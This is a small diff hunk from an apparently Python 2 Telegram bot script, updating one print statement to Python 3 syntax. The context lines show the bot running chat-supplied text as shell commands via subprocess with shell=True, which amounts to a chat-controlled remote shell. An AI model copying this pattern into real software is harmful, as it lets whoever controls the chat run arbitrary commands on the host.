@@ -76,7 +76,7 @@ def handle(msg):
 				try:
 					os.chdir(directory)
 					bot.sendMessage(chat_id,"\xF0\x9F\x93\x81 Changing Directory to: "+str(directory))
-					print "OK"
+					print ("OK")
 					bot.sendMessage(chat_id,'\xF0\x9F\x90\x8D '+str(makeitastring))
 					bot.sendMessage(chat_id,'\xF0\x9F\x92\xBB  [-] Wait.....[-]')
 					pp=subprocess.check_output(makeitastring,shell=True)
